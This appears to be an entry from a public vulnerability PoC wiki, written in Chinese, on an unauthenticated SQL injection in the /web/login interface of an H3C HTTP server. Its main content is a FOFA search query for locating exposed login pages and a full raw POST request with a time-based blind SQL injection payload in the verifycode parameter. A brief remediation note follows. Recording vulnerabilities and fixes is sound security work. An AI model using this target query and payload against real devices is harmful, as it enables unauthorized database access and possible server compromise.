---
fofa: "server="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# H3Chttp服务器 weblogin SQL注入漏洞

# 漏洞描述

H3Chttp服务器  在/web/login接口存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

# 影响版本

H3Chttp服务器

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：server="H3C httpd" && title=="请登录"

POC/EXP：

POST /web/login HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive

user_name=admin&password=admin&verifycode=1' AND (SELECT 9821 FROM (SELECT(SLEEP(5)))dfpe) AND 'dYCM'='&language=0

![image-20250213163039164](./.resource/H3Chttp服务器webloginSQL注入漏洞/media/image-20250213163039164.png)


![image-20250213163105158](./.resource/H3Chttp服务器webloginSQL注入漏洞/media/image-20250213163105158.png)


# 漏洞修复

参数使用预编译形式用以对sql注入防护，同时限制接口参数输入。

下载官方补丁进行修复


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
